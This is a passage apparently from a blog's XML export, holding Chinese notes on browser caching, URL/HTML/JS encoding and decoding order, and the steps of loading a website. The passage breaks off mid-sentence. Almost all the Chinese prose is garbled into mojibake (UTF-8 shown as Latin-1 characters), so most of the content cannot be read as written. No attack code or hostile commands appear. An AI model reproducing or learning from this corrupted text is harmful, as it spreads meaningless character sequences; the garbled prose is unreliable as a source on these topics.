        <category>æµè§ˆå™¨</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨</tag>
        <tag>æ¸²æŸ“</tag>
      </tags>
  </entry>
  <entry>
    <title>æµè§ˆå™¨ç¼“å­˜æœºåˆ¶</title>
    <url>/archives/7beb4c43.html</url>
    <content><![CDATA[<h1 id="æµè§ˆå™¨ç¼“å­˜æœºåˆ¶"><a href="#æµè§ˆå™¨ç¼“å­˜æœºåˆ¶" class="headerlink" title="æµè§ˆå™¨ç¼“å­˜æœºåˆ¶"></a>æµè§ˆå™¨ç¼“å­˜æœºåˆ¶</h1><p>æœ¬ç¬”è®°å‚è€ƒ</p>
<p><a href="https://www.jianshu.com/p/cb72dfb0f7b3">HTTPç¼“å­˜æœºåˆ¶ &amp; cookie&#x2F;localStorage&#x2F;sessionStorage</a></p>
<p>webç¼“å­˜åˆ†ç±»ï¼š</p>
<ol>
<li>æ•°æ®åº“æ•°æ®ç¼“å­˜</li>
<li>æœåŠ¡å™¨ç«¯ç¼“å­˜ï¼ˆä»£ç†æœåŠ¡å™¨ç¼“å­˜ï¼Œcdnç¼“å­˜ï¼‰</li>
<li>æµè§ˆå™¨ç«¯ç¼“å­˜</li>
<li>webåº”ç”¨å±‚ç¼“å­˜</li>
</ol>
<p>æµè§ˆå™¨ç¼“å­˜æœºåˆ¶ï¼š</p>
<ol>
<li>httpç¼“å­˜</li>
<li>æµè§ˆå™¨æœ¬åœ°å­˜å‚¨ï¼šcookie localstorage sessionStroage</li>
</ol>
<p>webå­˜å‚¨åˆ†ä¸ºlocalstorage ä¸sessionstorageä¸¤ç§</p>
<p><img src="/archives/7beb4c43/Untitled.png"></p>
<p>cookieä¸session</p>
<p><img src="/Untitled%201.png"></p>
<h2 id="httpç¼“å­˜"><a href="#httpç¼“å­˜" class="headerlink" title="httpç¼“å­˜"></a>httpç¼“å­˜</h2><p><strong>åˆ†ç±»ï¼šä¼˜å…ˆçº§ä¾æ¬¡é™ä½</strong>ï¼Œ</p>
<ol>
<li>memory cache:å­˜å‚¨åœ¨å†…å­˜ä¸­ç»™ä½ ï¼Œä¸€æ—¦çª—å£å…³é—­ï¼Œå…¶ä¸­çš„ç¼“å­˜å°±æ¶ˆå¤±äº†ã€‚ä¸€èˆ¬å­˜å‚¨ä¸€äº›ä½“ç§¯è¾ƒå°çš„èµ„æº</li>
<li>service worker cacheï¼šè„±ç¦»äºæµè§ˆå™¨çª—ä½“ï¼Œæ•…ä¸èƒ½æ“ä½œdom,å¯ä»¥å®ç°ç¦»çº¿ç¼“å­˜ã€æ¶ˆæ¯æ¨é€ä¸ç½‘ç»œä»£ç†åŠŸèƒ½</li>
<li>disk cacheï¼šå­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ï¼Œè¯»å†™é€Ÿåº¦è¾ƒæ…¢ï¼Œä½†å®¹ç§¯å¤§ï¼Œ</li>
<li>push cacheï¼šä¸€å®—å­˜åœ¨äºä¼šè¯æˆªæ–­çš„ç¼“å­˜ï¼Œå½“sessionç»ˆæ­¢çš„æ—¶å€™ï¼Œç¼“å­˜ä¹Ÿéšä¹‹é‡Šæ”¾ã€‚</li>
</ol>
<p><strong>æµè§ˆå™¨ç¼“å­˜è§„åˆ™</strong></p>
<ol>
<li>æ–°é²œåº¦ï¼šå³ç¼“å­˜å‰¯æœ¬çš„æœ‰æ•ˆæœŸã€‚</li>
<li>æ ¡éªŒå€¼ï¼šetagæœåŠ¡å™¨é€šè¿‡åŒ¹é…è¯¥å€¼æ¥åˆ¤æ–­ç¼“å­˜æ˜¯å¦è¿‡æœŸ</li>
</ol>
<p><strong>æµè§ˆå™¨çš„ç¼“å­˜æ§åˆ¶</strong></p>
<p><img src="/Untitled%202.png"></p>
<p><strong>æµè§ˆå™¨æ˜¯å¦é‡å‘æ•°æ®åˆ¤æ–­é€»è¾‘</strong></p>
<p><img src="/Untitled%203.png"></p>
<p>æµè§ˆå™¨è¯·æ±‚æ–°èµ„æºç¼“å­˜è¿‡ç¨‹</p>
<p><strong>æœ¬åœ°ç¼“å­˜é˜¶æ®µ(ä¹Ÿç§°å¼ºç¼“å­˜)</strong>ï¼šå…ˆåœ¨æœ¬åœ°æŸ¥æ‰¾è¯¥èµ„æºï¼Œå¦‚æœæœ‰å‘ç°è¯¥èµ„æºï¼Œè€Œä¸”è¯¥èµ„æºè¿˜æ²¡æœ‰è¿‡æœŸï¼Œå°±ä½¿ç”¨è¿™ä¸€ä¸ªèµ„æºï¼Œå®Œå…¨ä¸ä¼šå‘é€httpè¯·æ±‚åˆ°æœåŠ¡å™¨ï¼›</p>
<p><strong>åå•†ç¼“å­˜é˜¶æ®µ(ä¹Ÿç§°å¼±ç¼“å­˜)</strong>ï¼šå¦‚æœåœ¨æœ¬åœ°ç¼“å­˜æ‰¾åˆ°å¯¹åº”çš„èµ„æºï¼Œä½†æ˜¯ä¸çŸ¥é“è¯¥èµ„æºæ˜¯å¦è¿‡æœŸæˆ–è€…å·²ç»è¿‡æœŸï¼Œåˆ™å‘ä¸€ä¸ªhttpè¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨åˆ¤æ–­è¿™ä¸ªè¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºåœ¨æœåŠ¡å™¨ä¸Šæ²¡æœ‰æ”¹åŠ¨è¿‡ï¼Œåˆ™è¿”å›304ï¼Œè®©æµè§ˆå™¨ä½¿ç”¨æœ¬åœ°æ‰¾åˆ°çš„é‚£ä¸ªèµ„æºï¼›</p>
<p><strong>ç¼“å­˜å¤±è´¥é˜¶æ®µ</strong>ï¼šå½“æœåŠ¡å™¨å‘ç°è¯·æ±‚çš„èµ„æºå·²ç»ä¿®æ”¹è¿‡ï¼Œæˆ–è€…è¿™æ˜¯ä¸€ä¸ªæ–°çš„è¯·æ±‚(åœ¨æœ¬æ¥æ²¡æœ‰æ‰¾åˆ°èµ„æº)ï¼ŒæœåŠ¡å™¨åˆ™è¿”å›è¯¥èµ„æºçš„æ•°æ®ï¼Œå¹¶ä¸”è¿”å›200ï¼Œ å½“ç„¶è¿™ä¸ªæ˜¯æŒ‡æ‰¾åˆ°èµ„æºçš„æƒ…å†µä¸‹ï¼Œå¦‚æœæœåŠ¡å™¨ä¸Šæ²¡æœ‰è¿™ä¸ªèµ„æºï¼Œåˆ™è¿”å›404ã€‚</p>
<h3 id="Last-Modified-ETag-ä¸-Cache-Control-Expires"><a href="#Last-Modified-ETag-ä¸-Cache-Control-Expires" class="headerlink" title="Last-Modified&#x2F;ETag ä¸ Cache-Control&#x2F;Expires"></a>Last-Modified&#x2F;ETag ä¸ Cache-Control&#x2F;Expires</h3><ul>
<li>é…ç½® Last-Modified&#x2F;ETagçš„æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å†æ¬¡è®¿é—®ç»Ÿä¸€URIçš„èµ„æºï¼Œ<strong>è¿˜æ˜¯ä¼šå‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨</strong>è¯¢é—®æ–‡ä»¶æ˜¯å¦å·²ç»ä¿®æ”¹ï¼Œå¦‚æœæ²¡æœ‰ï¼ŒæœåŠ¡å™¨ä¼šåªå‘é€ä¸€ä¸ª304å›ç»™æµè§ˆå™¨ï¼Œå‘Šè¯‰æµè§ˆå™¨ç›´æ¥ä»è‡ªå·±æœ¬åœ°çš„ç¼“å­˜å–æ•°æ®ï¼›å¦‚æœä¿®æ”¹è¿‡é‚£å°±æ•´ä¸ªæ•°æ®é‡æ–°å‘ç»™æµè§ˆå™¨ï¼›</li>
<li>Cache-Control&#x2F;Expiresåˆ™ä¸åŒï¼Œå¦‚æœæ£€æµ‹åˆ°æœ¬åœ°çš„ç¼“å­˜è¿˜æ˜¯æœ‰æ•ˆçš„æ—¶é—´èŒƒå›´å†…ï¼Œæµè§ˆå™¨ç›´æ¥ä½¿ç”¨æœ¬åœ°å‰¯æœ¬ï¼Œ<strong>ä¸ä¼šå‘é€ä»»ä½•è¯·æ±‚</strong>ã€‚ä¸¤è€…ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œ Cache-Control&#x2F;Expiresçš„ä¼˜å…ˆçº§è¦é«˜ï¼Œå³<strong>å½“æœ¬åœ°å‰¯æœ¬æ ¹æ® Cache-Control&#x2F;Expireså‘ç°è¿˜åœ¨æœ‰æ•ˆæœŸå†…æ—¶ï¼Œåˆ™ä¸ä¼šå†æ¬¡å‘é€è¯·æ±‚å»æœåŠ¡å™¨è¯¢é—®ä¿®æ”¹æ—¶é—´ Last-Modifiedæˆ–å®ä½“æ ‡è¯† Etagäº†ã€‚</strong></li>
<li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸¤è€…ä¼šé…åˆä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸ºå³ä½¿æœåŠ¡å™¨è®¾ç½®ç¼“å­˜æ—¶é—´, å½“ç”¨æˆ·ç‚¹å‡»â€œåˆ·æ–°â€æŒ‰é’®æ—¶ï¼Œæµè§ˆå™¨ä¼šå¿½ç•¥ç¼“å­˜ç»§ç»­å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¿™æ—¶ Last-Modified&#x2F;ETagå°†èƒ½å¤Ÿå¾ˆå¥½åˆ©ç”¨304ï¼Œä»è€Œå‡å°‘å“åº”å¼€é”€ã€‚</li>
</ul>
<h3 id="æœ‰Last-Modifiedä¸ºä»€ä¹ˆè¿˜è¦æœ‰ETagï¼Ÿ"><a href="#æœ‰Last-Modifiedä¸ºä»€ä¹ˆè¿˜è¦æœ‰ETagï¼Ÿ" class="headerlink" title="æœ‰Last-Modifiedä¸ºä»€ä¹ˆè¿˜è¦æœ‰ETagï¼Ÿ"></a>æœ‰Last-Modifiedä¸ºä»€ä¹ˆè¿˜è¦æœ‰ETagï¼Ÿ</h3><p>HTTP1.1ä¸­Etagçš„å‡ºç°ä¸»è¦æ˜¯ä¸ºäº†è§£å†³å‡ ä¸ª Last-Modified æ¯”è¾ƒéš¾è§£å†³çš„é—®é¢˜ï¼š</p>
<ul>
<li>Last-Modified æ ‡æ³¨çš„æœ€åä¿®æ”¹åªèƒ½ç²¾ç¡®åˆ°ç§’çº§ï¼Œå¦‚æœæŸäº›æ–‡ä»¶åœ¨1ç§’é’Ÿä»¥å†…ï¼Œè¢«ä¿®æ”¹å¤šæ¬¡çš„è¯ï¼Œå®ƒå°†ä¸èƒ½å‡†ç¡®æ ‡æ³¨æ–‡ä»¶çš„æ–°é²œåº¦</li>
<li>å¦‚æœæŸäº›æ–‡ä»¶ä¼šè¢«å®šæœŸç”Ÿæˆï¼Œå½“æœ‰æ—¶å†…å®¹å¹¶æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œä½† Last-Modified å´æ”¹å˜äº†ï¼Œå¯¼è‡´æ–‡ä»¶æ²¡æ³•ä½¿ç”¨ç¼“å­˜</li>
<li>æœ‰å¯èƒ½å­˜åœ¨æœåŠ¡å™¨æ²¡æœ‰å‡†ç¡®è·å–æ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼Œæˆ–è€…ä¸ä»£ç†æœåŠ¡å™¨æ—¶é—´ä¸ä¸€è‡´ç­‰æƒ…å½¢</li>
</ul>
<p><img src="/Untitled%204.png"></p>
<p>å½“æ‰§è¡Œç›¸å…³æ“ä½œçš„æ—¶å€™ï¼Œå¯¹åº”çš„å“åº”å¤´éƒ¨å­—æ®µæ˜¯å¦æœ‰æ•ˆã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æµè§ˆå™¨</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨</tag>
        <tag>ç¼“å­˜</tag>
      </tags>
  </entry>
  <entry>
    <title>æµè§ˆå™¨ç¼–ç ä¸è§£ç </title>
    <url>/archives/8891b17.html</url>
    <content><![CDATA[<h1 id="æµè§ˆå™¨ç¼–ç ä¸è§£ç "><a href="#æµè§ˆå™¨ç¼–ç ä¸è§£ç " class="headerlink" title="æµè§ˆå™¨ç¼–ç ä¸è§£ç "></a>æµè§ˆå™¨ç¼–ç ä¸è§£ç </h1><h1 id="è®¿é—®ç½‘ç«™è¿‡ç¨‹ä¸­æ¶‰åŠçš„ç¼–è§£ç "><a href="#è®¿é—®ç½‘ç«™è¿‡ç¨‹ä¸­æ¶‰åŠçš„ç¼–è§£ç " class="headerlink" title="è®¿é—®ç½‘ç«™è¿‡ç¨‹ä¸­æ¶‰åŠçš„ç¼–è§£ç "></a>è®¿é—®ç½‘ç«™è¿‡ç¨‹ä¸­æ¶‰åŠçš„ç¼–è§£ç </h1><h2 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h2><p>åœ¨urlä¸­å¦‚æœåœ¨å‚æ•°éƒ¨åˆ†å‡ºç°&#x2F;ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œä¼šå¯¼è‡´æµè§ˆå™¨å¯¹èµ„æºè·¯å¾„çš„é”™è¯¯åˆ¤æ–­ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº†urlç¼–ç è¿™ä¸€æ¦‚å¿µï¼Œå®ƒæ˜¯ä»¥%åŠ å­—ç¬¦çš„asciiç å¯¹åº”çš„äºŒä½åå…­è¿›åˆ¶æ•°å¦‚ â€˜&#x3D;%23 space&#x3D;%20 </p>
<h2 id="HTMLç¼–ç "><a href="#HTMLç¼–ç " class="headerlink" title="HTMLç¼–ç "></a>HTMLç¼–ç </h2><p>åœ¨htmlä¸­æœ‰ä¸€äº›å­—ç¬¦æ˜¯éœ€è¦é¢„ç•™çš„ï¼Œå¦‚&lt; &amp; ç­‰ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥è¿™äº›å­—ç¬¦åè¢«ç›´æ¥è¾“å‡ºåˆ°htmlä¸­ï¼Œåˆ™å¯èƒ½å¯¼è‡´æµè§ˆå™¨åœ¨åˆ›å»ºdomæ ‘çš„æ—¶å€™é”™è¯¯çš„è¯†åˆ«æ ‡ç­¾çš„å¼€å§‹ï¼Œä»è€Œå¯¼è‡´é”™è¯¯ã€‚äºæ˜¯å¼•å…¥äº†htmlç¼–ç ï¼Œæœ‰ä¸¤ç§ç±»å‹ï¼Œè¢«ç§°ä¸ºHTMLç¼–ç ä¸HTMLç¼–å·ã€‚å¦‚&lt;å¯ä»¥è¢«è¡¨ç¤ºä¸ºï¼š&lt;,&#60;,&#x3c;</p>
<p><code>æ³¨æ„ï¼š</code>&amp;å¼€å¤´ ;ç»“å°¾</p>
<p>JSç¼–ç </p>
<p>jsç¼–ç é‡‡ç”¨unicodeå­—ç¬¦é›†ï¼Œå››ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦</p>
<p>jså¸¸è§çš„åæ–œæ æ–¹å¼ç¼–ç å¤„ç†</p>
<ul>
<li>\bé€€æ ¼ç¬¦ï¼Œ\tåˆ¶è¡¨ç¬¦ï¼Œ\vå‚ç›´åˆ¶è¡¨ç¬¦ç­‰ï¼›</li>
<li>ä¸‰ä½æ•°å­—ï¼Œä¸è¶³ä½æ•°ç”¨0è¡¥å……ï¼ŒæŒ‰8ä½åŸå­—ç¬¦å…«è¿›åˆ¶å­—ç¬¦ç¼–ç ï¼›</li>
<li>ä¸¤ä½æ•°å­—ï¼Œä¸è¶³ä½æ•°ç”¨0è¡¥å……ï¼ŒæŒ‰8ä½åŸå­—ç¬¦16è¿›åˆ¶å­—ç¬¦ç¼–ç ï¼Œå‰ç¼€ x</li>
<li>å››ä½æ•°å­—ï¼Œä¸è¶³ä¸ºæ•°ç”¨0è¡¥å……ï¼ŒæŒ‰16ä½åŸå­—ç¬¦16è¿›åˆ¶Unicodeæ•°å€¼ç¼–ç ï¼Œå‰ç¼€ u ã€‚</li>
</ul>
<p>å¦‚\145ã€\x65å’Œ\u0065éƒ½ä»£è¡¨å­—ç¬¦eã€‚</p>
<h1 id="æµè§ˆå™¨è§£ç é¡ºåº"><a href="#æµè§ˆå™¨è§£ç é¡ºåº" class="headerlink" title="æµè§ˆå™¨è§£ç é¡ºåº"></a>æµè§ˆå™¨è§£ç é¡ºåº</h1><h2 id="URLè§£ç "><a href="#URLè§£ç " class="headerlink" title="URLè§£ç "></a>URLè§£ç </h2><p>urlè§£ç è¿‡ç¨‹è¾ƒä¸ºç®€å•ï¼ŒæœåŠ¡å™¨å¯¹æ¥æ”¶åˆ°ç”¨æˆ·ä¼ è¾“è¿‡æ¥çš„URLè¿›è¡Œè§£æï¼Œé‡åˆ°%ä¾¿è‡ªåŠ¨è¿›è¡Œè§£ç ã€‚</p>
<h2 id="HTMLè§£ç "><a href="#HTMLè§£ç " class="headerlink" title="HTMLè§£ç "></a>HTMLè§£ç </h2><p>HTMLè§£æå™¨å…¶å®æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œåœ¨å¯¹HTMLèµ„æºä»ä¸Šè€Œä¸‹è¿›è¡Œè§£ææ—¶é‡åˆ°ä¸€ä¸ªâ€˜&lt;â€˜ç¬¦å·å°±ä¼šè¿›å…¥æ ‡ç­¾å¼€å§‹çŠ¶æ€ï¼ˆTag Open Stateï¼‰ï¼Œç„¶åæœå¯»æ ‡ç­¾ï¼Œimgå¯ä»¥è¢«è¯†åˆ«ä¸ºæ­£ç¡®çš„æ ‡ç­¾ï¼Œimg1åˆ™ä¸ä¼šè¯†åˆ«ï¼Œæœ€ååœ¨è¯»åˆ°æœ€è¿‘çš„ä¸€ä¸ªâ€˜&gt;â€™æ—¶ï¼Œç»“æŸæ ‡ç­¾çŠ¶æ€è¿›å…¥æ•°æ®çŠ¶æ€ï¼ˆData Stateï¼‰ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //æ— æ•ˆä»£ç </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //æœ‰æ•ˆä»£ç </span><br></pre></td></tr></table></figure>

<p>ä¸Šä¾‹ä¸­ï¼Œç¬¬ä¸€æ¡ä¸ä¼šè¢«æ­£å¸¸è§£æï¼Œç¬¬äºŒæ¡ä¼šè¢«æ­£å¸¸è§£æï¼Œç”±æ­¤å¯å°†<code>htmlå®ä½“ç¼–ç çš„è§£ç æ˜¯å‘ç”Ÿåœ¨DOMæ ‘æ„å»ºå®Œæˆåæ‰è¿›è¡Œçš„</code>ï¼Œ<code>æ•…htmlå®ä½“ç¼–ç åªèƒ½å‡ºç°åœ¨æ•°æ®åŒºåŸŸï¼Œä¸èƒ½å‡ºç°åœ¨æ ‡ç­¾å¼€å§‹çŠ¶æ€ä¸ç»“æŸçŠ¶æ€ï¼Œè¿™ä¸¤ç§çŠ¶æ€éƒ½ä¸ä¼šè¢«æˆåŠŸè§£ç </code>ã€‚è¿™å¾ˆé‡è¦</p>
<h2 id="JSè§£ç "><a href="#JSè§£ç " class="headerlink" title="JSè§£ç "></a>JSè§£ç </h2><p>å¾—åˆ°ä¸€ä¸ªhtmlæ–‡æ¡£åï¼Œæµè§ˆå™¨é¡ºåºæ„é€ domæ ‘ä¸cssomæ ‘ï¼Œå½“é‡åˆ°ä¸€ä¸ª<script>æ ‡ç­¾åï¼Œdomæ„å»ºè¢«é˜»å¡ï¼Œç­‰å¾…jsæ–‡ä»¶è¢«åŠ è½½å®Œæ¯•ï¼Œæ‰§è¡Œå®Œæ¯•ï¼Œä¹‹åç»§ç»­æ„å»ºdomæ ‘</p>
<p><strong>ä¸ºä»€ä¹ˆç°åœ¨çš„jsä»£ç è¢«æ”¾åœ¨æœ€åé¢ï¼Ÿ</strong></p>
<p>å› ä¸ºjsä»£ç ä¼šä¿®æ”¹å¹¶é˜»å¡domçš„æ¸²æŸ“ï¼Œè‹¥jsä»£ç æ”¾åœ¨headerä¸­åˆ™åœ¨jsæ‰§è¡Œå®Œæ¯•ä¹‹å‰ ï¼Œæµè§ˆå™¨çª—å£ä¼šæ˜¾ç¤ºä¸€ç‰‡ç©ºç™½ï¼Œç”¨æˆ·ä½“éªŒå·®ï¼Œå°†jsä»£ç æ”¾åœ¨æœ€åï¼Œèƒ½æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</p>
<p>jsçš„è„šæœ¬å¤„ç†æ¨¡å‹æ˜¯æŒ‰ç…§æºç å¤„ç†-å‡½æ•°è§£æ-ä»£ç æ‰§è¡Œè¿™ä¸ªæ‰§è¡Œæµæ¥çš„ï¼Œé‡ç‚¹æ˜¯ï¼Œå…ˆè§£ç å†æ‰§è¡Œï¼Œæ•…å¯å¯¹jsä»£ç ä¸­çš„ä»»æ„å†…å®¹è¿›è¡Œç¼–ç ï¼Œjséƒ½èƒ½è¢«æˆåŠŸæ‰§è¡Œã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æµè§ˆå™¨</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨</tag>
        <tag>ç¼–è§£ç </tag>
      </tags>
  </entry>
  <entry>
    <title>æµè§ˆå™¨è®¿é—®ç½‘ç«™è¿‡ç¨‹</title>
    <url>/archives/41b7ef22.html</url>
    <content><![CDATA[<h1 id="æµè§ˆå™¨è®¿é—®ç½‘ç«™è¿‡ç¨‹"><a href="#æµè§ˆå™¨è®¿é—®ç½‘ç«™è¿‡ç¨‹" class="headerlink" title="æµè§ˆå™¨è®¿é—®ç½‘ç«™è¿‡ç¨‹"></a>æµè§ˆå™¨è®¿é—®ç½‘ç«™è¿‡ç¨‹</h1><h1 id="QUESTION1ï¼šæµè§ˆå™¨è®¿é—®ç½‘ç«™çš„è¿‡ç¨‹"><a href="#QUESTION1ï¼šæµè§ˆå™¨è®¿é—®ç½‘ç«™çš„è¿‡ç¨‹" class="headerlink" title="QUESTION1ï¼šæµè§ˆå™¨è®¿é—®ç½‘ç«™çš„è¿‡ç¨‹"></a>QUESTION1ï¼šæµè§ˆå™¨è®¿é—®ç½‘ç«™çš„è¿‡ç¨‹</h1><h2 id="step1ï¼šç¼“å­˜æŸ¥æ‰¾"><a href="#step1ï¼šç¼“å­˜æŸ¥æ‰¾" class="headerlink" title="step1ï¼šç¼“å­˜æŸ¥æ‰¾"></a>step1ï¼šç¼“å­˜æŸ¥æ‰¾</h2><p>å¦‚æœæ”¹é¡µé¢åœ¨çŸ­æ—¶é—´å†…è¢«è®¿é—®è¿‡ï¼Œåˆ™ä¼šç»è¿‡ç¼“å­˜èŒ¶ç›æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦è¯·æ±‚æ–°çš„èµ„æºï¼Œæ ¹æ®max-ageã€expiresã€cache-controlã€if-none-matchã€last-modifiledã€etokenç­‰æ¥åˆ¤æ–­æ˜¯èµ°æµè§ˆå™¨ç¼“å­˜è¿˜æ˜¯å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ï¼Œèµ°æµè§ˆå™¨ç¼“å­˜åˆ™ç›´æ¥è¿”å›æ•°æ®ï¼Œå“åº”çŠ¶æ€è®¾ç½®ä¸ºç°è‰²çš„200ã€‚</p>
<h2 id="step1ï¼šåŸŸåè§£æ"><a href="#step1ï¼šåŸŸåè§£æ" class="headerlink" title="step1ï¼šåŸŸåè§£æ"></a>step1ï¼šåŸŸåè§£æ</h2><hr>
<p>é¦–å…ˆæµè§ˆå™¨éœ€è¦åšåŸŸåè§£æï¼Œåœ¨æµè§ˆå™¨æœ¬åœ°çš„ç¼“å­˜ä¸­å¯»æ‰¾æ˜¯å¦åˆè¯¥åŸŸåçš„è§£æï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆ°ä¸»æœºçš„ç¼“å­˜ä¸­å»å¯»æ‰¾ï¼Œå¦‚æœä¹Ÿæ²¡æœ‰ï¼Œå°±åˆ°ä¸»æœºçš„hostsæ–‡ä»¶ä¸­å»å¯»æ‰¾ï¼Œå¦‚æœä»ç„¶æ²¡æœ‰åˆ™åˆ°è·¯ç”±å™¨ä¸­æ‰¾ï¼Œå¦‚æœè¿˜æ²¡æœ‰åˆ™æ ¹æ®æŒ‡å®šçš„æœ¬åœ°dnsåœ°å€åˆ°æŒ‡å®šçš„æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸Šå»å¯»æ‰¾ï¼Œå¦‚æœæ²¡æœ‰å¯»æ‰¾åˆ°ï¼Œåˆ™åˆ°ç¼“å­˜ä¸­å»æ‰¾ï¼Œå¦‚æœä¹Ÿæ²¡æœ‰ä¸”å¦‚æœé…ç½®äº†è½¬å‘çš„è¯ï¼Œåˆ™ä¼šæŠŠè¿™ä¸ªè¯·æ±‚è½¬å‘åˆ°è¯¥åŸŸåæœåŠ¡å™¨çš„ä¸Šä¸€çº§åŸŸåæœåŠ¡å™¨è§£æï¼Œä¸Šä¸€çº§åŸŸåæœåŠ¡å™¨å¦‚æœä¹Ÿæ²¡æœ‰å¯»æ‰¾åˆ°è¦ä¹ˆå†åˆ°ä¸Šä¸€çº§æˆ–è€…åˆ°æ ¹æœåŠ¡å™¨å»å¯»æ‰¾ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åš<code>é€’å½’æŸ¥è¯¢</code>ã€‚æ ¹æœåŠ¡å™¨å‘ŠçŸ¥ä¸»æœºè´Ÿè´£è§£æé¡¶çº§åŸŸåçš„æœåŠ¡å™¨çš„åœ°å€ï¼Œé¡¶çº§åŸŸåæœåŠ¡å™¨å‘ŠçŸ¥è´Ÿè´£äºŒçº§åŸŸåè§£æçš„æœåŠ¡å™¨çš„åœ°å€ï¼ŒäºŒçº§åŸŸåè§£ææœåŠ¡å™¨å‘ŠçŸ¥ä¸‰çº§åŸŸåè§£æçš„æœåŠ¡å™¨çš„åœ°å€ï¼Œä¾æ¬¡è¿­ä»£ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥åŸŸåçš„è§£æä¸ºæ­¢ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åš<code>è¿­ä»£æŸ¥è¯¢</code>ã€‚</p>
<h2 id="step2ï¼šå»ºç«‹tcpè¿æ¥"><a href="#step2ï¼šå»ºç«‹tcpè¿æ¥" class="headerlink" title="step2ï¼šå»ºç«‹tcpè¿æ¥"></a>step2ï¼šå»ºç«‹tcpè¿æ¥</h2><hr>
<p>åŸŸåè§£æå®Œæˆåï¼Œå¼€å§‹å»ºç«‹tcpè¿æ¥ï¼Œè¿æ¥æ—¶è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œé¦–å…ˆå®¢æˆ·ç«¯å‘é€synæŠ¥æ–‡ï¼Œå°†æ ‡å¿—ä½synè®¾ä¸º1ï¼ŒåŒæ­¥åºåˆ—å·è®¾ä¸ºx,è¿›å…¥syn_sendçŠ¶æ€ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åå›ä¸€ä¸ªackæŠ¥æ–‡ï¼Œå…¶ä¸­æ ‡å¿—ä½synè®¾ä¸º1ï¼Œackæ ‡å¿—ä½è®¾ä¸º1ï¼ŒåŒæ­¥åºåˆ—å·è®¾ä¸ºy,ç¡®è®¤å·è®¾ä¸ºx+1ï¼Œè¿›å…¥syn_recieveçŠ¶æ€ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡ä¹‹åï¼Œå‘é€ç¡®è®¤æŠ¥æ–‡åˆ°æœåŠ¡å™¨ï¼Œackæ ‡å¿—ä½è®¾ä¸º1ï¼Œç¡®è®¤å·è®¾ä¸ºy+1,è¿›å…¥establishedçŠ¶æ€ï¼Œæ­¤æ—¶tcpè¿æ¥å»ºç«‹å®Œæ¯•ã€‚</p>
<h2 id="step3ï¼šå‘é€è¯·æ±‚"><a href="#step3ï¼šå‘é€è¯·æ±‚" class="headerlink" title="step3ï¼šå‘é€è¯·æ±‚"></a>step3ï¼šå‘é€è¯·æ±‚</h2><hr>
<p>tcpè¿æ¥å»ºç«‹åå¼€å§‹å¼€å§‹ä¼ é€httpåè®®æ•°æ®å†…å®¹ï¼Œç»è¿‡tcp&#x2F;ipåè®®äº”å±‚å±‚å±‚å°è£…ï¼Œæ•°æ®é¦–å…ˆåœ¨äº”å±‚ç¼–ç æˆäºŒè¿›åˆ¶ï¼Œå†åˆ°4å±‚ç»è¿‡tcpå±‚åŠ ä¸Š5å±‚åè®®çš„ç«¯å£å·ï¼Œæ ¹æ®æ•°æ®é“¾è·¯å±‚MTUå¯¹æ•°æ®è¿›è¡Œåˆ†æ®µï¼Œç„¶ååˆ°3å±‚åŠ ä¸Šipåœ°å€ä¸4å±‚åè®®å·ï¼Œç„¶åæ•°æ®åˆ°äº†ä¸‰å±‚åï¼Œé¦–å…ˆåˆ¤æ–­ç›®æ ‡ipåœ°å€æ˜¯ä¸æ˜¯ä¸æœ¬æœºå¤„åœ¨åŒä¸€ç½‘æ®µï¼Œå¦‚æœæ˜¯åœ¨åŒä¸€ç½‘æ®µï¼Œåˆ™æŸ¥è¯¢arpç¼“å­˜è¡¨ï¼Œæˆ–è€…è¿›è¡Œarpå¹¿æ’­ï¼Œå¦‚æœæ²¡æœ‰åœ¨åŒä¸€ç½‘æ®µåˆ™æ 